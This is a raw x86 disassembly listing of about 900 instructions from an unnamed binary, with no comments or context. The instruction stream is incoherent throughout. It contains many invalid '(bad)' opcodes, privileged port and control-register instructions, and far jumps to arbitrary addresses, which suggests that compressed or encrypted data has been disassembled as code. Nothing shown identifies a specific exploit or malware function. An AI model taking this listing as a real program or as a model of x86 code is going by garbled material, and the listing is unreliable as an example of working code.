  42777a:	xchg   edi,eax
  42777b:	and    eax,0x262f1a76
  427780:	das    
  427781:	lahf   
  427782:	call   0x6cefd91e
  427787:	mov    DWORD PTR [ecx],edx
  427789:	xor    eax,0x5c024d7
  42778e:	and    al,cl
  427790:	data16 aam 0x72
  427793:	ret    
  427794:	sub    DWORD PTR [eax+0x85a4a04],0x908d3683
  42779e:	sti    
  42779f:	pop    edx
  4277a0:	push   ecx
  4277a1:	pop    ecx
  4277a2:	xor    esp,DWORD PTR [esi-0x3a85cebd]
  4277a8:	add    bl,BYTE PTR [eax-0x4d8dfe00]
  4277ae:	dec    ecx
  4277af:	fbstp  TBYTE PTR [edx-0x44]
  4277b2:	xor    esp,ebp
  4277b4:	push   0xfffffff4
  4277b6:	addr16 mov bh,dh
  4277b9:	xchg   esp,eax
  4277ba:	test   al,0xd1
  4277bc:	pop    eax
  4277bd:	sbb    dh,ah
  4277bf:	iret   
  4277c0:	scas   al,BYTE PTR es:[edi]
  4277c1:	sub    bl,0xfe
  4277c4:	inc    ebp
  4277c5:	and    BYTE PTR [esi-0x27],ah
  4277c8:	imul   ebx,DWORD PTR [ebx+0x55031768],0x3ac883b4
  4277d2:	xchg   esi,eax
  4277d3:	xchg   ebp,eax
  4277d4:	push   cs
  4277d5:	mov    ecx,0xb28bac33
  4277da:	retf   0x6ab7
  4277dd:	cmp    dh,BYTE PTR [edx-0x2d447607]
  4277e3:	pop    es
  4277e4:	push   0x7b
  4277e6:	retf   
  4277e7:	sar    BYTE PTR [eax+0x24],0xc3
  4277eb:	sbb    dl,BYTE PTR [ebx-0x7d]
  4277ee:	add    ecx,DWORD PTR [ecx-0x2b45fdb6]
  4277f4:	dec    edx
  4277f5:	das    
  4277f6:	and    dh,BYTE PTR [esi-0x15ff1580]
  4277fc:	leave  
  4277fd:	mov    edx,0x2b08debc
  427802:	mov    bl,0xac
  427804:	sub    eax,DWORD PTR [ebx+0x26]
  427807:	lds    esi,FWORD PTR [edx+0x32eae2d7]
  42780d:	fcomp  QWORD PTR ds:0xe1b922cb
  427813:	and    dl,0x2
  427816:	(bad)  
  427817:	sub    DWORD PTR [esi-0x67],ecx
  42781a:	cmc    
  42781b:	(bad)  
  42781c:	lahf   
  42781d:	pop    es
  42781e:	scas   al,BYTE PTR es:[edi]
  42781f:	xchg   DWORD PTR [esi-0x30],esi
  427822:	int    0x77
  427824:	xor    DWORD PTR [edi+0x17],esp
  427827:	test   eax,0x6fbb0eba
  42782c:	cmp    al,0xa4
  42782e:	xchg   BYTE PTR [edi],cl
  427830:	mov    ds:0x2b83651c,eax
  427835:	ins    BYTE PTR es:[edi],dx
  427836:	mov    cl,0xb8
  427838:	push   ebx
  427839:	(bad)  
  42783a:	push   dx
  42783c:	inc    edx
  42783d:	das    
  42783e:	mov    ecx,0x9c75dddd
  427843:	pusha  
  427844:	xchg   edi,eax
  427845:	mov    bl,0xdc
  427847:	sbb    BYTE PTR [ecx-0x4f],ch
  42784a:	pop    edi
  42784b:	inc    esi
  42784c:	dec    ecx
  42784d:	js     0x4278af
  42784f:	mov    BYTE PTR [esi-0x1b],dh
  427852:	dec    ecx
  427853:	icebp  
  427854:	and    bh,dh
  427856:	adc    bl,BYTE PTR ds:0xfae9a2dc
  42785c:	mov    al,ds:0x438acf21
  427861:	mov    ss,WORD PTR [edx-0x32d6659d]
  427867:	(bad)  
  427868:	test   esi,0x8a7c9c3d
  42786e:	(bad)  
  42786f:	rcl    ecx,1
  427871:	or     al,0xbe
  427873:	pop    esp
  427874:	mov    bl,0xca
  427876:	js     0x4278b2
  427878:	rol    BYTE PTR [ebx+ebp*1+0x96c3a0],1
  42787f:	dec    esi
  427880:	xchg   esi,eax
  427881:	(bad)  
  427882:	mov    cl,0x1c
  427884:	jp     0x4278a9
  427886:	sbb    BYTE PTR [edi+edi*1-0x59],bh
  42788a:	inc    eax
  42788b:	jmp    0x4278d6
  42788d:	test   eax,0x52492c5f
  427892:	inc    ecx
  427893:	js     0x42784e
  427895:	adc    BYTE PTR [eax+0x282c4f81],dl
  42789b:	and    al,BYTE PTR [esi]
  42789d:	and    al,0xef
  42789f:	lea    ebp,[esi+0x73df213a]
  4278a5:	or     dl,BYTE PTR [eax]
  4278a7:	test   DWORD PTR [ebp-0x5259345c],ebp
  4278ad:	pop    esp
  4278ae:	mov    WORD PTR [eax+0x4a2bede9],?
  4278b4:	mov    ds:0x6cf5d86c,al
  4278b9:	cdq    
  4278ba:	inc    ebp
  4278bb:	xchg   ebx,eax
  4278bc:	repz pop ecx
  4278be:	xchg   edx,eax
  4278bf:	jb     0x4278cc
  4278c1:	sub    DWORD PTR [edx],0xffffffe0
  4278c4:	xchg   ecx,eax
  4278c5:	pop    esi
  4278c6:	add    eax,0xa249e752
  4278cb:	out    dx,eax
  4278cc:	rol    BYTE PTR [edx-0x68555853],cl
  4278d2:	mov    cl,0xa9
  4278d4:	xor    al,0x95
  4278d6:	mov    dl,0x71
  4278d8:	push   0xffffff80
  4278da:	ins    BYTE PTR es:[edi],dx
  4278db:	stc    
  4278dc:	xor    esp,DWORD PTR [eax+0x1d]
  4278df:	in     al,0xa4
  4278e1:	cdq    
  4278e2:	repz adc al,0x13
  4278e5:	pushf  
  4278e6:	fist   DWORD PTR [ecx-0x4a]
  4278e9:	sti    
  4278ea:	shl    DWORD PTR [ebp+0x4fc59423],cl
  4278f0:	clc    
  4278f1:	mov    cl,0x89
  4278f3:	xor    DWORD PTR [esi],esi
  4278f5:	lahf   
  4278f6:	cli    
  4278f7:	or     al,0x6e
  4278f9:	and    ebx,DWORD PTR [ebp+esi*1+0x38]
  4278fd:	call   0x35165eaa
  427902:	inc    esi
  427903:	loop   0x4278cb
  427905:	xlat   BYTE PTR ds:[ebx]
  427906:	cld    
  427907:	arpl   WORD PTR ds:0x1c7763ea,bp
  42790d:	fcomp  DWORD PTR [ebp+eiz*2+0x73]
  427911:	push   ss
  427912:	and    eax,0x6a8df3b3
  427917:	sahf   
  427918:	xchg   edi,eax
  427919:	out    dx,al
  42791a:	lds    esi,FWORD PTR [ebx+0x58]
  42791d:	ins    DWORD PTR es:[edi],dx
  42791e:	or     DWORD PTR [ebx+0x73de154b],0xe1f90dbb
  427928:	sub    ebx,DWORD PTR [ebx+0x5e]
  42792b:	xor    ch,ch
  42792d:	lods   al,BYTE PTR ds:[esi]
  42792e:	push   ss
  42792f:	adc    eax,0xcf6748c5
  427934:	stos   DWORD PTR es:[edi],eax
  427935:	fld    QWORD PTR [edi]
  427937:	je     0x4278cc
  427939:	cmp    DWORD PTR [ecx-0x2c],ebx
  42793c:	sbb    BYTE PTR ds:0x1a67bf0e,0x3e
  427943:	pop    es
  427944:	pop    eax
  427945:	stos   DWORD PTR es:[edi],eax
  427946:	lock call 0xf45:0x5dedf5ba
  42794e:	cdq    
  42794f:	xor    al,0x1e
  427951:	mov    edi,0x7bd0bbb1
  427956:	lds    ebp,FWORD PTR [edi+0x18]
  427959:	std    
  42795a:	jo     0x427916
  42795c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42795d:	xchg   esi,eax
  42795e:	shl    bl,1
  427960:	add    al,0x1a
  427962:	cmp    DWORD PTR [eax+esi*4-0x27],edi
  427966:	dec    ecx
  427967:	mov    esi,0x64518c8a
  42796c:	pop    ds
  42796d:	iret   
  42796e:	and    al,0xcc
  427970:	add    ch,bl
  427972:	cld    
  427973:	adc    eax,0xb1b2a964
  427978:	mov    ebx,0xf2d4e583
  42797d:	xchg   esi,eax
  42797e:	popf   
  42797f:	pop    es
  427980:	stc    
  427981:	(bad)  
  427982:	jl     0x427923
  427984:	pop    ds
  427985:	jp     0x427947
  427987:	adc    al,ch
  427989:	sahf   
  42798a:	arpl   WORD PTR [edi+ebp*1+0x60494370],di
  427991:	or     eax,0x8d0afd3
  427996:	jae    0x4279e3
  427998:	pop    esi
  427999:	mov    ch,0xd5
  42799b:	add    eax,0xc193a6f
  4279a0:	or     esi,DWORD PTR [esi+0x4127bf46]
  4279a6:	fcom   DWORD PTR [esi-0x2447fa26]
  4279ac:	push   esp
  4279ad:	(bad)  
  4279ae:	icebp  
  4279af:	daa    
  4279b0:	aad    0xb2
  4279b2:	mov    DWORD PTR [edx],0x3deef0f8
  4279b8:	int3   
  4279b9:	sub    eax,ecx
  4279bb:	test   BYTE PTR [edi+0x13],0xf1
  4279bf:	adc    al,0x43
  4279c1:	cmc    
  4279c2:	inc    esi
  4279c3:	outs   dx,DWORD PTR ds:[esi]
  4279c4:	test   DWORD PTR [ebp+0x4e],0xff1aefb7
  4279cb:	sub    dl,BYTE PTR [eax+esi*2]
  4279ce:	sbb    eax,0x891c0c37
  4279d3:	jbe    0x427981
  4279d5:	sbb    al,0x61
  4279d7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4279d9:	cld    
  4279da:	add    al,0xe4
  4279dc:	ds pop esp
  4279de:	mov    esp,0x362caee8
  4279e3:	lods   eax,DWORD PTR ds:[esi]
  4279e4:	and    ah,0x59
  4279e7:	outs   dx,BYTE PTR ds:[esi]
  4279e8:	mov    ah,BYTE PTR [eax+0x31]
  4279eb:	mov    edi,0xeb93141f
  4279f0:	dec    edi
  4279f1:	mov    ch,0x6c
  4279f3:	aas    
  4279f4:	jbe    0x42798f
  4279f6:	(bad)  
  4279f7:	push   cs
  4279f8:	(bad)  
  4279f9:	push   edi
  4279fa:	rcl    DWORD PTR [edi+0x4a],0x75
  4279fe:	out    dx,eax
  4279ff:	out    dx,eax
  427a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a01:	mov    edi,0xcd7c7037
  427a06:	sbb    eax,0xe945b774
  427a0b:	mov    ebx,0x51f5f6b4
  427a10:	and    esi,DWORD PTR [ecx-0x6992e2e5]
  427a16:	jbe    0x427a95
  427a18:	inc    esi
  427a19:	cli    
  427a1a:	test   DWORD PTR [ecx],edx
  427a1c:	js     0x427a38
  427a1e:	pop    es
  427a1f:	xor    bh,ch
  427a21:	js     0x427a00
  427a23:	aas    
  427a24:	dec    edx
  427a25:	push   ebx
  427a26:	icebp  
  427a27:	mov    eax,0xd8e84a2b
  427a2c:	(bad)  
  427a2d:	out    dx,eax
  427a2e:	aas    
  427a2f:	ret    
  427a30:	fistp  DWORD PTR [ecx+ebp*2]
  427a33:	in     eax,0x60
  427a35:	sub    al,dl
  427a37:	mov    edx,0xd061a25a
  427a3c:	push   edx
  427a3d:	pushf  
  427a3e:	hlt    
  427a3f:	cmp    eax,0x71d116b2
  427a44:	push   es
  427a45:	jbe    0x427a28
  427a47:	pop    edx
  427a48:	cmp    esp,esp
  427a4a:	xchg   esp,eax
  427a4b:	cld    
  427a4c:	xlat   BYTE PTR ds:[ebx]
  427a4d:	stos   BYTE PTR es:[edi],al
  427a4e:	inc    eax
  427a4f:	mov    ds:0x23df9767,al
  427a54:	mov    al,0xdb
  427a56:	shl    BYTE PTR [ecx+ebp*4-0x4da097eb],cl
  427a5d:	sub    BYTE PTR [ebp+ebx*8+0x77dd5f6c],0x12
  427a65:	std    
  427a66:	dec    edi
  427a67:	mov    ds:0xf38eca0d,al
  427a6c:	scas   eax,DWORD PTR es:[edi]
  427a6d:	mov    ah,0xe5
  427a6f:	and    edx,eax
  427a71:	adc    eax,0xba504342
  427a76:	enter  0x3f0d,0x43
  427a7a:	shl    dl,cl
  427a7c:	fst    DWORD PTR [ecx+0x40]
  427a7f:	cmp    al,BYTE PTR [eax]
  427a81:	add    BYTE PTR [ecx+0x3],bl
  427a84:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427a89:	pop    ds
  427a8a:	sub    ebp,DWORD PTR [esi-0x3e32c146]
  427a90:	scas   eax,DWORD PTR es:[edi]
  427a91:	mov    esp,0x1ec68
  427a96:	add    eax,DWORD PTR es:[eax]
  427a99:	add    BYTE PTR [ebx-0x79],bl
  427a9c:	push   ebp
  427a9d:	mov    edx,0x964839c4
  427aa2:	lods   al,BYTE PTR fs:[esi]
  427aa4:	icebp  
  427aa5:	xchg   ecx,eax
  427aa6:	mov    ss,WORD PTR [edx-0x66229124]
  427aac:	sbb    al,0x3c
  427aae:	ja     0x427aa7
  427ab0:	(bad)  
  427ab1:	sbb    bh,BYTE PTR [ecx+0x4cd6ab6f]
  427ab7:	ja     0x427ab6
  427ab9:	out    0xe3,al
  427abb:	stos   DWORD PTR es:[edi],eax
  427abc:	xchg   ebx,esp
  427abe:	mov    WORD PTR [ecx+0x2ae9c251],gs
  427ac4:	pop    esi
  427ac5:	xor    al,0x6c
  427ac7:	mov    ebx,0x748d51d0
  427acc:	jne    0x427a6a
  427ace:	sbb    DWORD PTR [eax+0x49ab7553],ecx
  427ad4:	sbb    al,0xaf
  427ad6:	sub    bh,ah
  427ad8:	cli    
  427ad9:	xlat   BYTE PTR ds:[ebx]
  427ada:	neg    BYTE PTR [edi-0x11]
  427add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ade:	mov    ebx,eax
  427ae0:	lods   eax,DWORD PTR ds:[esi]
  427ae1:	xor    al,0xd3
  427ae3:	or     BYTE PTR [esi],0xe7
  427ae6:	ret    0x108a
  427ae9:	jg     0x427aa7
  427aeb:	mov    ds:0x82412637,al
  427af0:	push   0xfffffff6
  427af2:	lock inc ecx
  427af4:	dec    ebx
  427af5:	into   
  427af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427af7:	xor    eax,0xf7bab9e6
  427afc:	repnz xchg esi,eax
  427afe:	(bad)  
  427aff:	and    eax,0x50c3ebfc
  427b04:	stos   BYTE PTR es:[edi],al
  427b05:	loope  0x427aaf
  427b07:	fadd   st,st(7)
  427b09:	idiv   BYTE PTR [esi-0x21c6c1c2]
  427b0f:	stos   BYTE PTR es:[edi],al
  427b10:	clc    
  427b11:	push   eax
  427b12:	popf   
  427b13:	pop    edi
  427b14:	ret    0x9c21
  427b17:	ins    DWORD PTR es:[edi],dx
  427b18:	pop    ds
  427b19:	mov    ecx,DWORD PTR [ecx]
  427b1b:	xchg   edi,eax
  427b1c:	cld    
  427b1d:	sbb    eax,ebp
  427b1f:	test   al,0x50
  427b21:	or     BYTE PTR [esi+0x64ffa9fa],bl
  427b27:	pop    es
  427b28:	aam    0x6
  427b2a:	mov    al,0x74
  427b2c:	mov    ?,WORD PTR [edx]
  427b2e:	jne    0x427b09
  427b30:	sub    al,0x5a
  427b32:	sub    dl,BYTE PTR [edi]
  427b34:	cdq    
  427b35:	adc    al,0xa
  427b37:	dec    esi
  427b38:	shl    DWORD PTR [edi],0x15
  427b3b:	ja     0x427b71
  427b3d:	dec    ebx
  427b3e:	fwait
  427b3f:	inc    ebx
  427b40:	add    esi,esi
  427b42:	xor    ebx,DWORD PTR [edx-0x67ae34d7]
  427b48:	mov    dh,0x66
  427b4a:	(bad)  
  427b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b4c:	mov    ebx,0xd118a410
  427b51:	ret    
  427b52:	rol    DWORD PTR [edi],cl
  427b54:	repz inc ebp
  427b56:	imul   edx,ecx,0xffffffde
  427b59:	dec    edi
  427b5a:	lods   al,BYTE PTR ds:[esi]
  427b5b:	dec    esp
  427b5c:	jmp    0x5ad40035
  427b61:	call   0x5e1c:0xbea67423
  427b68:	fs jp  0x427b13
  427b6b:	inc    ebx
  427b6c:	enter  0x4399,0x8b
  427b70:	dec    ebp
  427b71:	cmp    DWORD PTR [ecx+0x180a974a],0xffffff8f
  427b78:	jmp    0xd9448e61
  427b7d:	mov    al,0xb3
  427b7f:	pop    edx
  427b80:	jle    0x427bac
  427b82:	lea    eax,[esi+0x37b48328]
  427b88:	sbb    bl,BYTE PTR [edi-0x6d0f4443]
  427b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b8f:	inc    esi
  427b90:	push   es
  427b91:	data16 mov WORD PTR [edi+edx*8+0x44],fs
  427b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b97:	jo     0x427be3
  427b99:	cld    
  427b9a:	shr    BYTE PTR [ecx],0xfa
  427b9d:	lahf   
  427b9e:	and    DWORD PTR [ebp+0xbd39e63],0x81d4587d
  427ba8:	mov    eax,ds:0xcdd5a283
  427bad:	add    edi,esp
  427baf:	ds dec esp
  427bb1:	stos   BYTE PTR es:[edi],al
  427bb2:	mov    edi,0xa98300a4
  427bb7:	pop    DWORD PTR [ebp+0x37]
  427bba:	push   es
  427bbb:	test   al,0xff
  427bbd:	push   ds
  427bbe:	sbb    edx,0x32
  427bc1:	xor    BYTE PTR [ebx-0x5d],bh
  427bc4:	dec    ecx
  427bc5:	sbb    BYTE PTR [eax],al
  427bc7:	xor    ebx,DWORD PTR [ebx]
  427bc9:	sbb    eax,0x6bd6a526
  427bce:	call   0xe7ad:0x6f6884e4
  427bd5:	sub    BYTE PTR [ebp+ebx*2+0x67],dh
  427bd9:	mov    eax,0x5b5c1a19
  427bde:	retf   0x55c7
  427be1:	or     ebp,DWORD PTR [esi-0x50]
  427be4:	test   BYTE PTR [ecx],cl
  427be6:	jae    0x427b9f
  427be8:	push   esi
  427be9:	mov    esp,0xefa586b8
  427bee:	jo     0x427ba0
  427bf0:	iret   
  427bf1:	out    0x15,eax
  427bf3:	xchg   DWORD PTR [eax+esi*2],edx
  427bf6:	aaa    
  427bf7:	xchg   edi,eax
  427bf8:	sub    BYTE PTR [edi-0x7fa35b8e],0xd1
  427bff:	sbb    al,0xbe
  427c01:	lea    ebp,[esi]
  427c03:	cmp    BYTE PTR [edx-0x22],dh
  427c06:	loopne 0x427c4e
  427c08:	pop    edi
  427c09:	lea    edx,[ecx+0x20]
  427c0c:	xchg   ecx,eax
  427c0d:	xchg   ecx,eax
  427c0e:	dec    ecx
  427c0f:	inc    ebp
  427c10:	cwde   
  427c11:	jbe    0x427c52
  427c13:	cs pop ebp
  427c15:	jge    0x427bd9
  427c17:	cmp    DWORD PTR [eax],esp
  427c19:	dec    edi
  427c1a:	push   eax
  427c1b:	dec    edx
  427c1c:	adc    DWORD PTR [eax+ebp*2],0x60783f18
  427c23:	mov    cl,0x7c
  427c25:	push   ss
  427c26:	dec    esp
  427c27:	xchg   esi,eax
  427c28:	into   
  427c29:	gs (bad) 
  427c2c:	fiadd  DWORD PTR [edi-0x7fc3a6ad]
  427c32:	clc    
  427c33:	mov    dh,BYTE PTR [edx-0x71]
  427c36:	cld    
  427c37:	mov    edx,0xdb6a04f2
  427c3c:	push   edx
  427c3e:	or     ecx,esp
  427c40:	pop    es
  427c41:	sbb    esp,DWORD PTR [eax]
  427c43:	push   0x4f
  427c45:	and    DWORD PTR [ebp+0x1d01a5da],0xffffffa3
  427c4c:	pop    edx
  427c4d:	scas   al,BYTE PTR es:[edi]
  427c4e:	js     0x427c52
  427c50:	pushf  
  427c51:	or     ebp,DWORD PTR [edi-0x2fd7a2b5]
  427c57:	jne    0x427c65
  427c59:	pop    esp
  427c5a:	out    dx,al
  427c5b:	mov    bh,0x8b
  427c5d:	sbb    DWORD PTR [eax+0x3b],0xa78718be
  427c64:	push   ds
  427c65:	fsub   st,st(7)
  427c67:	je     0x427c05
  427c69:	out    0xee,eax
  427c6b:	adc    DWORD PTR [eax-0x6f],edi
  427c6e:	jno    0x427c68
  427c70:	xchg   esp,eax
  427c71:	mov    esp,0x1ba72138
  427c76:	enter  0x1343,0xaa
  427c7a:	cmp    ecx,eax
  427c7c:	inc    esi
  427c7d:	not    BYTE PTR [edx-0x36]
  427c80:	xor    cl,BYTE PTR [eax]
  427c82:	sub    eax,0xf0ded9c1
  427c87:	add    eax,0xbc1fc2b2
  427c8c:	inc    esp
  427c8d:	mov    dl,0x64
  427c8f:	jge    0x427ca4
  427c91:	(bad)  
  427c93:	and    BYTE PTR [esi-0x46ede689],ch
  427c99:	(bad)  
  427c9a:	neg    BYTE PTR [eax+0x6e]
  427c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c9e:	sar    DWORD PTR [edx],1
  427ca0:	mov    ecx,0x4f9a5925
  427ca5:	(bad)  
  427ca6:	mov    edx,0xea6efa9e
  427cab:	(bad)  
  427cac:	call   0x70a2:0x27d58719
  427cb3:	push   eax
  427cb4:	inc    ecx
  427cb5:	and    edi,DWORD PTR [esi+0x65]
  427cb8:	pushf  
  427cb9:	fbstp  TBYTE PTR [ecx-0x18f4d47d]
  427cbf:	repz add eax,esi
  427cc2:	mov    eax,0x7a0ea9d7
  427cc7:	pop    edi
  427cc8:	mov    WORD PTR [ecx-0xebc30bd],fs
  427cce:	jmp    0x51c1:0x543f19f
  427cd5:	or     dh,cl
  427cd7:	int    0x4a
  427cd9:	sahf   
  427cda:	add    BYTE PTR [eax-0x31],0x12
  427cde:	and    ch,BYTE PTR [edi-0x28]
  427ce1:	mov    ebx,0x54659ccc
  427ce6:	mov    dl,bh
  427ce8:	xor    BYTE PTR [edx+0x4836d86f],0x30
  427cef:	loop   0x427d12
  427cf1:	dec    ebp
  427cf2:	stos   DWORD PTR es:[edi],eax
  427cf3:	xor    edi,DWORD PTR ds:0x3491b895
  427cf9:	ror    edi,1
  427cfb:	jb     0x427c93
  427cfd:	push   ebx
  427cfe:	sub    BYTE PTR [edi-0x6e],0x1e
  427d02:	jns    0x427c94
  427d04:	add    eax,0x78f1cc30
  427d09:	ror    DWORD PTR [esi+0x4a],cl
  427d0c:	ret    
  427d0d:	and    eax,0xfe51aaf5
  427d12:	sub    BYTE PTR [esp+esi*1+0x72],0xa3
  427d17:	mov    ch,0x77
  427d19:	cs inc ecx
  427d1b:	fbld   TBYTE PTR [ebp-0xa6ad901]
  427d21:	repnz lea eax,[ecx+0x73]
  427d25:	mov    ecx,0xacd64028
  427d2a:	leave  
  427d2b:	push   esi
  427d2c:	adc    BYTE PTR [edi-0x208f0681],0x4e
  427d33:	fistp  QWORD PTR [ebx]
  427d35:	mov    esi,0xb0580769
  427d3a:	mov    es,WORD PTR [eax-0xcf5a116]
  427d40:	push   esp
  427d41:	in     al,0x3a
  427d43:	ins    BYTE PTR es:[edi],dx
  427d44:	dec    eax
  427d45:	inc    esp
  427d46:	sbb    al,0x7f
  427d48:	jecxz  0x427dad
  427d4a:	adc    dl,BYTE PTR [ecx-0x5a98c0ad]
  427d50:	(bad)  
  427d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d52:	js     0x427d01
  427d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d55:	or     cl,BYTE PTR [edx-0x1bf080df]
  427d5b:	jo     0x427ddb
  427d5d:	pop    ecx
  427d5e:	pop    ds
  427d5f:	push   0xad74b85b
  427d64:	into   
  427d65:	test   al,0x81
  427d67:	jae    0x427d6c
  427d69:	pop    ds
  427d6a:	sub    DWORD PTR [eax+0x68e8e705],eax
  427d70:	cmp    BYTE PTR [ebx-0x1fe2ca91],bh
  427d76:	sbb    BYTE PTR [edx+0x59],bl
  427d79:	add    esi,esp
  427d7b:	rol    ecx,1
  427d7d:	jo     0x427d0c
  427d7f:	fwait
  427d80:	xchg   DWORD PTR [esp+eiz*2+0x37877e4c],edx
  427d87:	adc    edx,DWORD PTR [esi]
  427d89:	pushf  
  427d8a:	fild   WORD PTR [eax-0x1aafc5ed]
  427d90:	and    edi,DWORD PTR [edx-0x2e]
  427d93:	lods   eax,DWORD PTR ds:[esi]
  427d94:	and    BYTE PTR [esp+eax*2],0xe7
  427d98:	arpl   WORD PTR ds:0x676f4e14,si
  427d9e:	ret    0xeacc
  427da1:	pop    edi
  427da2:	test   eax,0x173427ad
  427da7:	test   DWORD PTR [ebp+eax*2+0x487ae2b4],ebx
  427dae:	mov    ch,0x51
  427db0:	inc    eax
  427db1:	mov    al,0xd9
  427db3:	xchg   edx,eax
  427db4:	mov    esp,0x97d98f55
  427db9:	loope  0x427e22
  427dbb:	xchg   ebp,eax
  427dbc:	pusha  
  427dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dbe:	mov    al,0x50
  427dc0:	add    BYTE PTR [eax],al
  427dc2:	sbb    esp,DWORD PTR [edi]
  427dc4:	pushf  
  427dc5:	cli    
  427dc6:	mov    esp,0x2ae77ffb
  427dcb:	scas   al,BYTE PTR es:[edi]
  427dcc:	aad    0xf
  427dce:	sbb    ebp,DWORD PTR [edi]
  427dd0:	add    bh,BYTE PTR [esi+0x1ef8e]
  427dd6:	add    eax,DWORD PTR es:[eax]
  427dd9:	add    BYTE PTR ds:0xb13742b1,al
  427ddf:	inc    eax
  427de0:	icebp  
  427de1:	data16 adc dh,bl
  427de4:	push   es
  427de5:	sub    eax,0x33275479
  427dea:	dec    eax
  427deb:	in     eax,0xfd
  427ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dee:	aaa    
  427def:	ret    
  427df0:	mov    dl,0x68
  427df2:	cmp    esi,DWORD PTR [ebx-0x141cfce0]
  427df8:	mov    ds:0xb1098162,al
  427dfd:	les    eax,FWORD PTR [edi]
  427dff:	outs   dx,DWORD PTR ds:[esi]
  427e00:	(bad)  
  427e01:	jecxz  0x427da8
  427e03:	adc    eax,esi
  427e05:	jmp    0x427de6
  427e07:	xor    DWORD PTR [ecx],esp
  427e09:	sbb    eax,0x8ba68abe
  427e0e:	sar    BYTE PTR [esi],1
  427e10:	outs   dx,BYTE PTR ds:[esi]
  427e11:	mov    ch,0xbe
  427e13:	jns    0x427e34
  427e15:	into   
  427e16:	fild   QWORD PTR [ecx]
  427e18:	pop    edi
  427e19:	out    0xad,al
  427e1b:	pop    eax
  427e1c:	xchg   edi,eax
  427e1d:	xor    ah,BYTE PTR [ecx-0x36f3f7e2]
  427e23:	mov    ah,0xa5
  427e25:	xor    cl,BYTE PTR [ebx]
  427e27:	fist   DWORD PTR [edi-0x49]
  427e2a:	sbb    DWORD PTR ds:0xcc3b607,ebx
  427e30:	loop   0x427e1c
  427e32:	aaa    
  427e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e34:	pop    ds
  427e35:	jg     0x427e0a
  427e37:	adc    edx,esi
  427e39:	sbb    al,0xd0
  427e3b:	fst    QWORD PTR [eax]
  427e3d:	loopne 0x427e0b
  427e3f:	adc    al,0x76
  427e41:	jo     0x427dde
  427e43:	xor    eax,0xe829c7b
  427e48:	outs   dx,DWORD PTR ds:[esi]
  427e49:	inc    esi
  427e4a:	jo     0x427e9b
  427e4c:	pop    esp
  427e4d:	mov    edi,cr1
  427e50:	jno    0x427def
  427e52:	mov    ebp,0xc46a1f79
  427e57:	mov    ds:0xdb244608,al
  427e5c:	loopne 0x427e34
  427e5e:	fwait
  427e5f:	test   al,0xf3
  427e61:	sub    eax,0x84c675b8
  427e66:	xchg   DWORD PTR [eax-0x43],esi
  427e69:	dec    esp
  427e6a:	adc    DWORD PTR [ebx],0x52a5b09e
  427e70:	cmp    eax,0x91b956c8
  427e75:	lods   eax,DWORD PTR ds:[esi]
  427e76:	mov    BYTE PTR [edx],al
  427e78:	dec    ebx
  427e79:	dec    esp
  427e7a:	and    DWORD PTR [ebx],ecx
  427e7c:	dec    ecx
  427e7d:	scas   eax,DWORD PTR es:[edi]
  427e7e:	mov    bh,0x5c
  427e80:	mov    bh,0x7b
  427e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e83:	rol    BYTE PTR [esi+0x3d60d515],cl
  427e89:	jmp    0xc4c849d
  427e8e:	scas   eax,DWORD PTR es:[edi]
  427e8f:	sbb    al,dh
  427e91:	fdivr  st,st(6)
  427e93:	std    
  427e94:	in     al,dx
  427e95:	nop
  427e96:	sbb    eax,0x1b4285ed
  427e9b:	mov    edx,0x2ab6f13b
  427ea0:	pop    es
  427ea1:	test   al,0x46
  427ea3:	push   ss
  427ea4:	mov    esi,0xcb31d5a7
  427ea9:	aas    
  427eaa:	adc    al,0xac
  427eac:	retf   0xadf2
  427eaf:	imul   esp,DWORD PTR [edx-0x5d9dada0],0xffffffc7
  427eb6:	iret   
  427eb7:	xchg   ecx,eax
  427eb8:	mov    dh,0x46
  427eba:	and    BYTE PTR [ebp-0x32e75275],bl
  427ec0:	rcr    BYTE PTR ds:0x62cbb3d1,1
  427ec6:	dec    edi
  427ec7:	cmp    eax,0x79bcecf3
  427ecc:	cmp    eax,0xdf918cb7
  427ed1:	in     eax,0xf7
  427ed3:	sbb    eax,0x5e441fe5
  427ed8:	push   esp
  427ed9:	sbb    edi,esi
  427edb:	xlat   BYTE PTR ds:[ebx]
  427edc:	add    dh,ch
  427ede:	pop    edi
  427edf:	mov    ds:0x3d621218,eax
  427ee4:	sub    dh,BYTE PTR [ecx-0x33359be8]
  427eea:	xchg   esp,eax
  427eeb:	pop    eax
  427eec:	xchg   BYTE PTR [esi+0x64],dl
  427eef:	inc    edx
  427ef0:	test   BYTE PTR [esi-0x616e2e5c],bl
  427ef6:	pushf  
  427ef7:	xchg   BYTE PTR [ebp+esi*1+0x53],bh
  427efb:	xchg   edx,eax
  427efc:	push   es
  427efd:	jp     0x427f24
  427eff:	sar    BYTE PTR [ecx],1
  427f01:	and    al,0x2e
  427f03:	fadd   QWORD PTR [edi]
  427f05:	pushf  
  427f06:	lock pushf 
  427f08:	sub    DWORD PTR [eax],0xffffff96
  427f0b:	popa   
  427f0c:	inc    esi
  427f0d:	jmp    0x718f:0x2c75f000
  427f14:	fucomip st,st(3)
  427f16:	ja     0x427ea6
  427f18:	aad    0x85
  427f1a:	or     DWORD PTR [edi+0x7a],0xffffffbb
  427f1e:	les    ebp,FWORD PTR [edi+eiz*4+0x7bcd8875]
  427f25:	mov    edi,DWORD PTR [edx-0x3d]
  427f28:	rcr    ecx,1
  427f2a:	mov    eax,0x5cbcdd6a
  427f2f:	xchg   esi,eax
  427f30:	jecxz  0x427eea
